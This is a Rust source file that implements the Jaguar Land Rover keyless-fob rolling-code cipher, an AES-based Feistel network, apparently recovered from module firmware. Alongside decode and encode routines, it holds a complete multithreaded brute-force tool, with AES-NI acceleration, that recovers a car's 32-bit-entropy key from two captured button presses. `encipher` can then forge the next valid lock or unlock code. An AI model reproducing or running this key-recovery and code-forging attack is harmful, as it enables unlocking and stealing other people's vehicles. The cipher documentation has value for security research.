//! Jaguar Land Rover keyless-fob button cipher (the "Ford V1 (JLR)" rolling code).
//!
//! JLR's 2015–2018 keyless fobs send [Ford V1](ford_v1.rs)'s 136-bit frame, but the 8 rolling bytes
//! (`raw[7..15]`) are enciphered under the car's 16-byte key instead of Ford's scramble. The cipher,
//! recovered from the keyless module's firmware (its XGATE routine at XGATE address 0x1058, which
//! calls an AES-128 at 0x123C for each round) and confirmed against every recorded press of every
//! module (see `docs/ford_v1_jlr.md`), is a **three-round Feistel network** on the 64-bit payload
//! whose round function is AES-128:
//!
//! ```text
//! F_i(x) = AES-128(K, 0x00 ×12 ‖ x)[4·i .. 4·i+3]      for i = 1, 2, 3   (x is a 4-byte half)
//! ```
//!
//! The module (receiver) deciphers a press — `L‖R` the two 4-byte halves of the payload — as
//! `M1 = L ^ F1(R); M2 = R ^ F2(M1); M3 = M1 ^ F3(M2); plaintext = M3‖M2`. The fob enciphers with the
//! same network run the other way (the module only ever runs AES forward, hence no inverse S-box in
//! its firmware). The 8-byte plaintext is `button(1) ‖ counter(3, big-endian) ‖ fob ID(4)`; the
//! button is 0x01 Lock, 0x02 Unlock, 0x04 Trunk, and the counter rises by 2 each press.
//!
//! The key `K` is the car's, 16 bytes from the module's D-Flash configuration record (offset 0x0E14);
//! KAT never ships one. A user supplies their own car's key (see [`crate::keystore`]); without a key
//! JLR frames stay decode-only. The key has the form X‖Y‖Y‖X seen in every module, but this code does
//! not assume that — it uses the 16 bytes as given.

/// AES-128 forward S-box.
const SBOX: [u8; 256] = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
];

const RCON: [u8; 10] = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

/// AES-128 key schedule: 11 round keys (176 bytes).
fn expand_key(key: &[u8; 16]) -> [u8; 176] {
    let mut w = [0u8; 176];
    w[..16].copy_from_slice(key);
    for i in 4..44 {
        let mut t = [w[(i - 1) * 4], w[(i - 1) * 4 + 1], w[(i - 1) * 4 + 2], w[(i - 1) * 4 + 3]];
        if i % 4 == 0 {
            t = [SBOX[t[1] as usize] ^ RCON[i / 4 - 1], SBOX[t[2] as usize], SBOX[t[3] as usize], SBOX[t[0] as usize]];
        }
        for j in 0..4 {
            w[i * 4 + j] = w[(i - 4) * 4 + j] ^ t[j];
        }
    }
    w
}

fn xtime(x: u8) -> u8 {
    (x << 1) ^ if x & 0x80 != 0 { 0x1b } else { 0 }
}

/// AES-128 encryption of one 16-byte block (forward only — the JLR round function needs no decrypt).
fn aes128_encrypt(rk: &[u8; 176], block: &[u8; 16]) -> [u8; 16] {
    let mut s = *block;
    for (b, k) in s.iter_mut().zip(&rk[..16]) {
        *b ^= k;
    }
    for round in 1..=10 {
        for b in s.iter_mut() {
            *b = SBOX[*b as usize];
        }
        // ShiftRows (state is column-major: byte r + 4c is row r, column c).
        let t = s;
        for r in 1..4 {
            for c in 0..4 {
                s[r + 4 * c] = t[r + 4 * ((c + r) % 4)];
            }
        }
        if round != 10 {
            for c in 0..4 {
                let col = [s[4 * c], s[4 * c + 1], s[4 * c + 2], s[4 * c + 3]];
                for r in 0..4 {
                    s[4 * c + r] = xtime(col[r])
                        ^ (xtime(col[(r + 1) % 4]) ^ col[(r + 1) % 4])
                        ^ col[(r + 2) % 4]
                        ^ col[(r + 3) % 4];
                }
            }
        }
        for (b, k) in s.iter_mut().zip(&rk[round * 16..round * 16 + 16]) {
            *b ^= k;
        }
    }
    s
}

/// The Feistel round function `F_i(x) = AES-128(K, 0^12 ‖ x)[4i .. 4i+3]` (x a 4-byte half).
fn round_f(rk: &[u8; 176], half: [u8; 4], i: usize) -> [u8; 4] {
    let mut block = [0u8; 16];
    block[12..16].copy_from_slice(&half);
    let out = aes128_encrypt(rk, &block);
    out[4 * i..4 * i + 4].try_into().unwrap()
}

fn xor4(a: [u8; 4], b: [u8; 4]) -> [u8; 4] {
    [a[0] ^ b[0], a[1] ^ b[1], a[2] ^ b[2], a[3] ^ b[3]]
}

/// Decipher an 8-byte payload the way the car's module does: `plaintext = M3 ‖ M2`.
pub fn decipher(payload: &[u8; 8], key: &[u8; 16]) -> [u8; 8] {
    let rk = expand_key(key);
    let l: [u8; 4] = payload[0..4].try_into().unwrap();
    let r: [u8; 4] = payload[4..8].try_into().unwrap();
    let m1 = xor4(l, round_f(&rk, r, 1));
    let m2 = xor4(r, round_f(&rk, m1, 2));
    let m3 = xor4(m1, round_f(&rk, m2, 3));
    let mut out = [0u8; 8];
    out[0..4].copy_from_slice(&m3);
    out[4..8].copy_from_slice(&m2);
    out
}

/// Encipher an 8-byte plaintext the way the fob does (the inverse of [`decipher`]).
pub fn encipher(plain: &[u8; 8], key: &[u8; 16]) -> [u8; 8] {
    let rk = expand_key(key);
    let m3: [u8; 4] = plain[0..4].try_into().unwrap();
    let m2: [u8; 4] = plain[4..8].try_into().unwrap();
    let m1 = xor4(m3, round_f(&rk, m2, 3));
    let r = xor4(m2, round_f(&rk, m1, 2));
    let l = xor4(m1, round_f(&rk, r, 1));
    let mut out = [0u8; 8];
    out[0..4].copy_from_slice(&l);
    out[4..8].copy_from_slice(&r);
    out
}

/// A deciphered press: button, 24-bit counter, fob ID.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Press {
    pub button: u8,
    pub counter: u32,
    pub id: u32,
}

/// The transponder ID folded to 16 bits (high half XOR low half), as the frame header carries it.
pub fn fold_id(id: u32) -> u16 {
    ((id >> 16) as u16) ^ (id as u16)
}

/// The plaintext of a press: `button ‖ counter(24, big-endian) ‖ id(32, big-endian)`.
pub fn plain_bytes(p: Press) -> [u8; 8] {
    let mut b = [0u8; 8];
    b[0] = p.button;
    b[1..4].copy_from_slice(&p.counter.to_be_bytes()[1..]);
    b[4..8].copy_from_slice(&p.id.to_be_bytes());
    b
}

fn parse_plain(plain: &[u8; 8]) -> Press {
    Press {
        button: plain[0],
        counter: ((plain[1] as u32) << 16) | ((plain[2] as u32) << 8) | plain[3] as u32,
        id: u32::from_be_bytes(plain[4..8].try_into().unwrap()),
    }
}

/// Button code → name for a deciphered JLR press (`0` means no key / not deciphered).
pub fn button_name(code: u8) -> Option<&'static str> {
    match code {
        0x01 => Some("Lock"),
        0x02 => Some("Unlock"),
        0x04 => Some("Trunk"),
        _ => None,
    }
}

/// Try `key` against an 8-byte payload whose header carried `folded` (the folded ID). Accepts it only
/// when the deciphered ID folds to `folded` and the button is one the fob sends — a filter a wrong key
/// passes with probability about 3/256 · 2^-16 ≈ 2^-22 (one press), so two presses of a fob pin its
/// key uniquely (see [`recover`]).
pub fn try_decipher(payload: &[u8; 8], folded: u16, key: &[u8; 16]) -> Option<Press> {
    let p = parse_plain(&decipher(payload, key));
    (button_name(p.button).is_some() && fold_id(p.id) == folded).then_some(p)
}

/// The 16-byte key built from a 32-bit `X`: `X ‖ ~X ‖ ~X ‖ X`. Every configured module's key has this
/// shape (see `docs/ford_v1_jlr.md`), so the key has only 32 bits of entropy and can be recovered by
/// exhaustive search over `X` from a couple of captured presses.
pub fn candidate_key(x: u32) -> [u8; 16] {
    let (a, b) = (x.to_be_bytes(), (!x).to_be_bytes());
    let mut k = [0u8; 16];
    k[0..4].copy_from_slice(&a);
    k[4..8].copy_from_slice(&b);
    k[8..12].copy_from_slice(&b);
    k[12..16].copy_from_slice(&a);
    k
}

/// Is `x` consistent with every captured press of one fob — each deciphers under `candidate_key(x)` to
/// a valid button, folds to that press's header value, and all share one ID? Returns the most recent
/// press's fields (highest counter) when so, which the caller can use to make the next code.
pub fn x_matches(presses: &[(u16, [u8; 8])], x: u32) -> Option<Press> {
    let key = candidate_key(x);
    let mut id = None;
    let mut best: Option<Press> = None;
    for (folded, payload) in presses {
        let p = try_decipher(payload, *folded, &key)?;
        if id.replace(p.id).is_some_and(|prev| prev != p.id) {
            return None;
        }
        if best.is_none_or(|b| p.counter > b.counter) {
            best = Some(p);
        }
    }
    best
}

/// Sweep `X` in `[lo, hi)` and return the values consistent with all presses (single-threaded; the
/// caller splits the 2^32 space across threads). Used by `kat --jlr-recover`.
pub fn recover_range(presses: &[(u16, [u8; 8])], lo: u64, hi: u64) -> Vec<u32> {
    (lo..hi).map(|x| x as u32).filter(|&x| x_matches(presses, x).is_some()).collect()
}

/// The whole key space: $2^{32}$ values of `X`.
pub const RECOVER_TOTAL: u64 = 1 << 32;

/// Progress and cancellation for a background key recovery ([`recover_with`]).
#[derive(Default)]
pub struct RecoverControl {
    /// Values of `X` tried so far (out of [`RECOVER_TOTAL`]), for a progress bar.
    pub tested: std::sync::atomic::AtomicU64,
    /// Set to ask the sweep to stop early.
    pub cancel: std::sync::atomic::AtomicBool,
}

/// Recover the 32-bit key from captured presses of one fob: sweep all 2^32 values of `X` across all
/// cores and return the values consistent with every press (normally exactly one). Uses AES-NI where
/// available (~a minute on a modern x86-64), else the portable path (much slower). The caller turns a
/// unique `X` into the key with [`candidate_key`].
pub fn recover(presses: &[(u16, [u8; 8])]) -> Vec<u32> {
    recover_with(presses, &RecoverControl::default())
}

/// [`recover`] with progress and cancellation (for the TUI's "Recover key (JLR)"). Returns the
/// consistent `X` values; an empty vec if cancelled before one was found.
pub fn recover_with(presses: &[(u16, [u8; 8])], ctl: &RecoverControl) -> Vec<u32> {
    let threads = std::thread::available_parallelism().map_or(1, |n| n.get()) as u64;
    let chunk = RECOVER_TOTAL.div_ceil(threads.max(1));
    std::thread::scope(|s| {
        let handles: Vec<_> = (0..threads)
            .map(|t| {
                let (lo, hi) = (t * chunk, ((t + 1) * chunk).min(RECOVER_TOTAL));
                s.spawn(move || recover_chunk(presses, lo, hi, ctl))
            })
            .collect();
        handles.into_iter().flat_map(|h| h.join().unwrap()).collect()
    })
}

/// One thread's slice, in sub-chunks so cancellation and progress are responsive.
fn recover_chunk(presses: &[(u16, [u8; 8])], lo: u64, hi: u64, ctl: &RecoverControl) -> Vec<u32> {
    use std::sync::atomic::Ordering;
    const STEP: u64 = 1 << 20; // check cancel / report progress about every million keys
    let mut out = Vec::new();
    let mut x = lo;
    while x < hi {
        if ctl.cancel.load(Ordering::Relaxed) {
            break;
        }
        let end = (x + STEP).min(hi);
        out.extend(recover_range_fast(presses, x, end));
        ctl.tested.fetch_add(end - x, Ordering::Relaxed);
        x = end;
    }
    out
}

fn recover_range_fast(presses: &[(u16, [u8; 8])], lo: u64, hi: u64) -> Vec<u32> {
    #[cfg(target_arch = "x86_64")]
    if std::is_x86_feature_detected!("aes") {
        // SAFETY: only reached when the CPU has AES-NI (checked just above).
        return unsafe { aesni::recover_range(presses, lo, hi) };
    }
    recover_range(presses, lo, hi)
}

/// AES-NI 2^32 sweep (x86-64 with the `aes` feature). Same cipher as the portable path; a unit test
/// checks they agree.
#[cfg(target_arch = "x86_64")]
mod aesni {
    use super::{button_name, candidate_key, fold_id, xor4};
    use core::arch::x86_64::*;

    #[target_feature(enable = "aes")]
    unsafe fn expand(x: u32) -> [__m128i; 11] {
        let k = candidate_key(x);
        let mut rk = [_mm_setzero_si128(); 11];
        rk[0] = _mm_loadu_si128(k.as_ptr() as *const __m128i);
        macro_rules! step {
            ($i:expr, $rc:expr) => {{
                let g = _mm_shuffle_epi32(_mm_aeskeygenassist_si128(rk[$i - 1], $rc), 0xff);
                let mut t = rk[$i - 1];
                t = _mm_xor_si128(t, _mm_slli_si128(t, 4));
                t = _mm_xor_si128(t, _mm_slli_si128(t, 4));
                t = _mm_xor_si128(t, _mm_slli_si128(t, 4));
                rk[$i] = _mm_xor_si128(t, g);
            }};
        }
        step!(1, 0x01); step!(2, 0x02); step!(3, 0x04); step!(4, 0x08); step!(5, 0x10);
        step!(6, 0x20); step!(7, 0x40); step!(8, 0x80); step!(9, 0x1b); step!(10, 0x36);
        rk
    }

    #[target_feature(enable = "aes")]
    unsafe fn f(rk: &[__m128i; 11], half: [u8; 4], i: usize) -> [u8; 4] {
        let mut blk = [0u8; 16];
        blk[12..16].copy_from_slice(&half);
        let mut b = _mm_xor_si128(_mm_loadu_si128(blk.as_ptr() as *const __m128i), rk[0]);
        for r in rk.iter().take(10).skip(1) {
            b = _mm_aesenc_si128(b, *r);
        }
        b = _mm_aesenclast_si128(b, rk[10]);
        let mut o = [0u8; 16];
        _mm_storeu_si128(o.as_mut_ptr() as *mut __m128i, b);
        o[4 * i..4 * i + 4].try_into().unwrap()
    }

    #[target_feature(enable = "aes")]
    pub unsafe fn recover_range(presses: &[(u16, [u8; 8])], lo: u64, hi: u64) -> Vec<u32> {
        let mut out = Vec::new();
        for xv in lo..hi {
            let x = xv as u32;
            let rk = expand(x);
            let mut id: Option<u32> = None;
            let mut ok = true;
            for (folded, pay) in presses {
                let (l, r): ([u8; 4], [u8; 4]) = (pay[0..4].try_into().unwrap(), pay[4..8].try_into().unwrap());
                let m1 = xor4(l, f(&rk, r, 1));
                let m2 = xor4(r, f(&rk, m1, 2));
                let m3 = xor4(m1, f(&rk, m2, 3));
                let pid = u32::from_be_bytes(m2);
                if button_name(m3[0]).is_none() || fold_id(pid) != *folded || id.replace(pid).is_some_and(|p| p != pid) {
                    ok = false;
                    break;
                }
            }
            if ok {
                out.push(x);
            }
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// candidate_key has the X‖~X‖~X‖X shape, and recovery finds the planted X from two presses.
    #[test]
    fn recovers_the_32bit_key_from_two_presses() {
        let x = 0x0001_ABCDu32; // kept small so the test can sweep a short range
        let key = candidate_key(x);
        assert_eq!(&key[0..4], &key[12..16]);
        assert_eq!(key[0] ^ key[4], 0xFF);
        let id = 0xA696_4338u32;
        let presses: Vec<(u16, [u8; 8])> = [0x0012_3400u32, 0x0012_3402]
            .iter()
            .map(|&c| (fold_id(id), encipher(&plain_bytes(Press { button: 0x02, counter: c, id }), &key)))
            .collect();
        assert_eq!(recover_range(&presses, 0, 0x2_0000), vec![x], "the planted X is uniquely recovered");
        // one press alone leaves more than one candidate in the same short range (needs a second press)
        assert!(recover_range(&presses[..1], 0, 0x2_0000).len() >= 1);
    }

    /// On x86-64 with AES-NI, the fast sweep agrees with the portable one over a range.
    #[cfg(target_arch = "x86_64")]
    #[test]
    fn aesni_sweep_matches_portable() {
        if !std::is_x86_feature_detected!("aes") {
            return;
        }
        let x = 0x0000_BEEFu32;
        let key = candidate_key(x);
        let id = 0x2F47_AB35u32;
        let presses: Vec<(u16, [u8; 8])> = [0x0055_6600u32, 0x0055_6602]
            .iter()
            .map(|&c| (fold_id(id), encipher(&plain_bytes(Press { button: 0x01, counter: c, id }), &key)))
            .collect();
        let want = recover_range(&presses, 0, 0x1_0000);
        let got = unsafe { super::aesni::recover_range(&presses, 0, 0x1_0000) };
        assert_eq!(got, want);
        assert_eq!(got, vec![x]);
    }

    /// FIPS-197 appendix C.1 AES-128 test vector.
    #[test]
    fn aes128_fips197_c1() {
        let key: [u8; 16] = core::array::from_fn(|i| i as u8);
        let pt: [u8; 16] = core::array::from_fn(|i| (i as u8).wrapping_mul(0x11));
        let want = [
            0x69, 0xc4, 0xe0, 0xd8, 0x6a, 0x7b, 0x04, 0x30, 0xd8, 0xcd, 0xb7, 0x80, 0x70, 0xb4, 0xc5,
            0x5a,
        ];
        assert_eq!(aes128_encrypt(&expand_key(&key), &pt), want);
    }

    /// encipher and decipher are inverses for any key and plaintext.
    #[test]
    fn feistel_round_trips() {
        let key: [u8; 16] = core::array::from_fn(|i| (i as u8).wrapping_mul(7).wrapping_add(3));
        for seed in 0u64..64 {
            let plain = seed.wrapping_mul(0x9E37_79B9_7F4A_7C15).to_be_bytes();
            assert_eq!(decipher(&encipher(&plain, &key), &key), plain);
        }
    }

    /// A press enciphered under a key is deciphered back to the same fields, and the folded-ID filter
    /// accepts the right key and rejects a wrong one.
    #[test]
    fn press_round_trips_and_filter_holds() {
        let key: [u8; 16] = core::array::from_fn(|i| (i as u8) ^ 0x5A);
        let press = Press { button: 0x02, counter: 0x80_000D, id: 0xA696_4338 };
        let payload = encipher(&plain_bytes(press), &key);
        assert_eq!(try_decipher(&payload, fold_id(press.id), &key), Some(press));
        let wrong: [u8; 16] = core::array::from_fn(|i| i as u8);
        assert_eq!(try_decipher(&payload, fold_id(press.id), &wrong), None);
    }

    /// The all-zero key is a valid key (one read module was unconfigured and its fobs decipher so).
    #[test]
    fn zero_key_is_usable() {
        let key = [0u8; 16];
        let press = Press { button: 0x04, counter: 0x12_3456, id: 0x2F47_AB35 };
        let payload = encipher(&plain_bytes(press), &key);
        assert_eq!(try_decipher(&payload, fold_id(press.id), &key), Some(press));
    }
}

